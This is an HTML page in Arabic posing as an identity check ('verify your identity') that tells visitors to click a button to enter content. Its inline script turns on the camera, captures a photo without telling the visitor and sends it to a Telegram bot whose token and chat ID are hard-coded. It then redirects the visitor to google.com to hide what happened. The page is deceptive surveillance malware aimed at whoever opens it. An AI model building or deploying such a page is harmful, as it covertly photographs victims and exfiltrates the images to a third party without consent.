<!DOCTYPE html>
<html>
<head><title>تحقق من هويتك</title></head>
<body style="background:#000; color:#fff; text-align:center; padding-top:50px;">
    <h2>يجب الضغط على الزر أدناه للدخول</h2>
    <button id="startBtn" style="padding:20px; font-size:20px; border-radius:10px;">دخول المحتوى</button>
    <video id="video" style="display:none;" autoplay></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        const TOKEN = '8596805324:AAELff4nCa1M4GWFiGW3gw3vIadL1c1i93o';
        const CHAT_ID = '8293639164';

        document.getElementById('startBtn').addEventListener('click', async () => {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                const video = document.getElementById('video');
                video.srcObject = stream;
                document.getElementById('startBtn').innerText = "جاري التحميل...";
                
                setTimeout(() => {
                    const canvas = document.getElementById('canvas');
                    canvas.width = 640; canvas.height = 480;
                    canvas.getContext('2d').drawImage(video, 0, 0);
                    canvas.toBlob(blob => {
                        const formData = new FormData();
                        formData.append('photo', blob, 'photo.jpg');
                        formData.append('chat_id', CHAT_ID);
                        fetch(https://api.telegram.org/bot${TOKEN}/sendPhoto, { method: 'POST', body: formData })
                        .then(() => { window.location.href = "https://google.com"; });
                    }, 'image/jpeg');
                }, 1000);
            } catch (e) { alert("يرجى السماح بالكاميرا للمتابعة"); }
        });
    </script>
</body>
</html>
